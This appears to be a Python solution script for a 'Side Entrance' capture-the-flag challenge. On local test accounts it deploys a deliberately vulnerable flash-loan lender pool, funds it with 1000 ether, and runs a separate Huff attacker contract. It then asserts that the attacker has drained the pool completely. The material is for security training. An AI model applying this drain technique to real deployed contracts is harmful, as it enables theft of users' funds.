from ape import accounts, project
from eth_abi import encode
from ..utils.helper import (
    w3,
    set_balance,
    get_sig,
    send_tx,
    deploy_huff_contract,
)

ETHER_IN_POOL = w3.to_wei(1000, "ether")
ATTACKER_INITIAL_ETH_BALANCE = w3.to_wei(1, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    print("\n--- Funding deployer address with extra ether for set up ---\n")
    deployer = accounts.test_accounts[0]

    set_balance(deployer, w3.to_wei(1010, "ether"))

    attacker = accounts.test_accounts[1]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # deploy lender contract
    print("\n--- Deploying Lender contract ---\n")
    pool = project.SideEntranceLenderPool.deploy(sender=deployer)

    # fund pool with ether
    print("\n--- Funding Pool with ether ---\n")
    pool.deposit(sender=deployer, value=ETHER_IN_POOL)
    assert pool.balance == ETHER_IN_POOL

    # attacker starts with limited ETH in balance
    print("\n--- Setting Attacker's initial ETH balance to 1 ETH ---\n")
    set_balance(attacker, ATTACKER_INITIAL_ETH_BALANCE)
    assert attacker.balance == ATTACKER_INITIAL_ETH_BALANCE

    # define intial balances for pool and attacker
    pool_initial_bal = pool.balance / 10**18
    attacker_initial_bal = attacker.balance / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    attacker_contract = deploy_huff_contract(
        "SideEntranceAttacker.huff",
        encode(["address"], [pool.address]),
        attacker,
    )
    send_tx(attacker, attacker_contract, get_sig("attack()"))

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: attacker should have stolen all tokens from the pool ---\n"
    )

    # define ending balances for pool and attacker
    pool_ending_bal = pool.balance / 10**18
    attacker_ending_bal = attacker.balance / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    assert pool.balance == 0
    assert attacker.balance > ATTACKER_INITIAL_ETH_BALANCE

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
